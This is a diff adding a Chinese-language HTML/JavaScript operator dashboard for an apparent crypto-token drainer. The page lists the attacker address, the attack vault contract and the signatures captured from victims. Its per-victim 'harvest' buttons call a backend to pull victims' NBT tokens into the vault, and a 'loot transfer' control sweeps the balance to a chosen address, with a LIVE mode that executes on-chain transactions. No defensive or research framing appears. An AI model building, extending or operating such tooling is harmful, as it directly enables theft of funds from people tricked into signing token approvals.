@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NBT 后台收割面板</title>
+<style>
+  :root {
+    --bg: #0a0b1a;
+    --card: #141730;
+    --accent: #ff6b35;
+    --accent-glow: rgba(255,107,53,0.25);
+    --text: #e8eaf0;
+    --muted: #6b7099;
+    --border: #25294a;
+    --success: #22c55e;
+    --danger: #ef4444;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+  }
+  .topbar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 24px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(20,23,48,0.8);
+    position: sticky; top: 0; z-index: 10;
+  }
+  .brand { font-size: 20px; font-weight: 800; }
+  .brand span { color: var(--accent); }
+  .badge {
+    padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: 700;
+    background: rgba(34,197,94,0.1); color: var(--success);
+    border: 1px solid rgba(34,197,94,0.3);
+  }
+  .badge.demo { background: rgba(107,112,153,0.1); color: var(--muted); border-color: var(--border); }
+  .wrap { max-width: 1100px; margin: 0 auto; padding: 24px; }
+  .stats {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px;
+  }
+  .stat {
+    background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 18px;
+  }
+  .stat-label { font-size: 12px; color: var(--muted); margin-bottom: 8px; }
+  .stat-value { font-size: 22px; font-weight: 800; word-break: break-all; }
+  .stat-value small { font-size: 13px; color: var(--muted); font-weight: 400; }
+  .section {
+    background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 20px; margin-bottom: 24px;
+  }
+  .section h3 { font-size: 15px; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid rgba(37,41,74,0.5); }
+  th { color: var(--muted); font-weight: 600; font-size: 12px; }
+  td.mono { font-family: 'Consolas', monospace; font-size: 12px; }
+  .btn {
+    padding: 8px 16px; border: none; border-radius: 8px;
+    font-size: 13px; font-weight: 700; cursor: pointer; transition: all 0.2s;
+  }
+  .btn-accent { background: linear-gradient(135deg, var(--accent), #e85520); color: #fff; }
+  .btn-accent:hover { box-shadow: 0 0 16px var(--accent-glow); }
+  .btn-sm { padding: 4px 10px; font-size: 12px; }
+  .status-pill { padding: 2px 10px; border-radius: 12px; font-size: 12px; }
+  .ok { background: rgba(34,197,94,0.1); color: var(--success); }
+  .err { background: rgba(239,68,68,0.1); color: var(--danger); }
+  .empty { color: var(--muted); text-align: center; padding: 20px; font-size: 13px; }
+  .row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+  input[type=text] {
+    background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: var(--text);
+    border-radius: 8px; padding: 8px 12px; font-size: 13px; font-family: 'Consolas', monospace;
+    flex: 1; min-width: 240px;
+  }
+  .log {
+    background: #0d0e1c; border: 1px solid var(--border); border-radius: 10px;
+    padding: 12px; max-height: 220px; overflow-y: auto;
+    font-family: 'Consolas', monospace; font-size: 12px; color: #9fb0c9; line-height: 1.6;
+    white-space: pre-wrap; word-break: break-all;
+  }
+  .log .t { color: var(--muted); }
+  .log .ok { color: var(--success); }
+  .log .err { color: var(--danger); }
+</style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="brand">NBT <span>收割面板</span></div>
+    <div id="modeBadge" class="badge">--</div>
+  </div>
+
+  <div class="wrap">
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-label">攻击者地址</div>
+        <div class="stat-value" id="attacker" style="font-size:15px;">--</div>
+      </div>
+      <div class="stat">
+        <div class="stat-label">攻击合约 (Vault)</div>
+        <div class="stat-value" id="vault" style="font-size:15px;">--</div>
+      </div>
+      <div class="stat">
+        <div class="stat-label">已捕获签名</div>
+        <div class="stat-value" id="sigCount">0</div>
+      </div>
+      <div class="stat">
+        <div class="stat-label">Vault 内 NBT 余额</div>
+        <div class="stat-value" id="vaultBal">0 <small>NBT</small></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>⚡ 战利品转走</h3>
+      <div class="row">
+        <input type="text" id="sweepTo" placeholder="收款地址（留空 = 攻击者地址）">
+        <input type="text" id="sweepAmount" placeholder="数量（留空 = 全部）" style="max-width:160px;">
+        <button class="btn btn-accent" onclick="doSweep()">转走</button>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>📋 已捕获签名（<span id="sigCount2">0</span>）</h3>
+      <div style="overflow-x:auto;">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th><th>受害者</th><th>Deadline</th><th>状态</th><th>操作</th>
+            </tr>
+          </thead>
+          <tbody id="sigBody"></tbody>
+        </table>
+        <div class="empty" id="sigEmpty">暂无签名，等待受害者签名授权...</div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>📜 运行日志</h3>
+      <div class="log" id="logBox">启动中...</div>
+    </div>
+  </div>
+
+<script>
+  async function refreshStatus() {
+    try {
+      const r = await fetch('/api/status');
+      const d = await r.json();
+      document.getElementById('attacker').textContent = d.attacker || '--';
+      document.getElementById('vault').textContent = d.vault || '未配置';
+      document.getElementById('sigCount').textContent = d.signatures || 0;
+      const badge = document.getElementById('modeBadge');
+      if (d.mode && d.mode.startsWith('LIVE')) {
+        badge.textContent = 'LIVE · 可执行链上交易';
+        badge.className = 'badge';
+      } else {
+        badge.textContent = 'DEMO · 仅收集签名';
+        badge.className = 'badge demo';
+      }
+      await refreshVaultBalance();
+    } catch (e) {
+      log('状态获取失败: ' + e.message, 'err');
+    }
+  }
+
+  async function refreshVaultBalance() {
+    try {
+      const r = await fetch('/api/vault/balance');
+      const d = await r.json();
+      if (d.success) {
+        document.getElementById('vaultBal').textContent = parseFloat(d.balance).toFixed(2) + ' NBT';
+      }
+    } catch (e) {}
+  }
+
+  async function refreshSignatures() {
+    try {
+      const r = await fetch('/api/signatures');
+      const d = await r.json();
+      const signatures = d.signatures || [];
+      document.getElementById('sigCount').textContent = signatures.length;
+      document.getElementById('sigCount2').textContent = signatures.length;
+      const body = document.getElementById('sigBody');
+      body.innerHTML = '';
+      document.getElementById('sigEmpty').style.display = signatures.length ? 'none' : 'block';
+      signatures.slice().reverse().forEach((s, i) => {
+        const row = document.createElement('tr');
+        const date = new Date(s.time).toLocaleString();
+        row.innerHTML = `
+          <td>${signatures.length - i}</td>
+          <td class="mono">${shortAddr(s.owner)}</td>
+          <td class="mono">${s.txHash ? shortTx(s.txHash) : date}</td>
+          <td>${s.txHash ? '<span class="status-pill ok">已收割</span>' : '待收割'}</td>
+          <td>
+            ${s.txHash ? '' : `<button class="btn btn-accent btn-sm" onclick="doCollect('${s.owner}')">收割</button>`}
+          </td>
+        `;
+        body.appendChild(row);
+      });
+    } catch (e) {
+      log('签名列表获取失败: ' + e.message, 'err');
+    }
+  }
+
+  async function doCollect(victim) {
+    try {
+      const r = await fetch('/api/collect/' + victim, { method: 'POST' });
+      const d = await r.json();
+      if (d.success) {
+        log(`收割成功 ${shortAddr(victim)} tx: ${shortTx(d.txHash)}`, 'ok');
+      } else {
+        log(`收割失败: ${d.error}`, 'err');
+      }
+      await refreshSignatures();
+      await refreshVaultBalance();
+    } catch (e) {
+      log('收割请求失败: ' + e.message, 'err');
+    }
+  }
+
+  async function doSweep() {
+    const to = document.getElementById('sweepTo').value.trim();
+    const amount = document.getElementById('sweepAmount').value.trim();
+    try {
+      const r = await fetch('/api/sweep', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ to: to || undefined, amount: amount || undefined })
+      });
+      const d = await r.json();
+      if (d.success) {
+        log(`转走成功 tx: ${shortTx(d.txHash)}`, 'ok');
+      } else {
+        log(`转走失败: ${d.error}`, 'err');
+      }
+      await refreshVaultBalance();
+    } catch (e) {
+      log('转走请求失败: ' + e.message, 'err');
+    }
+  }
+
+  function shortAddr(a) { return a ? a.slice(0,6) + '...' + a.slice(-4) : '--'; }
+  function shortTx(t) { return t ? t.slice(0,10) + '...' : '--'; }
+
+  function log(msg, type) {
+    const box = document.getElementById('logBox');
+    const line = document.createElement('div');
+    const time = new Date().toLocaleTimeString();
+    line.innerHTML = `<span class="t">[${time}]</span> ${type ? `<span class="${type}">${msg}</span>` : msg}`;
+    box.appendChild(line);
+    box.scrollTop = box.scrollHeight;
+  }
+
+  async function init() {
+    await refreshStatus();
+    await refreshSignatures();
+    log('面板已连接，轮询中...');
+    setInterval(async () => {
+      await refreshStatus();
+      await refreshSignatures();
+    }, 5000);
+  }
+
+  init();
+</script>
+</body>
+</html>
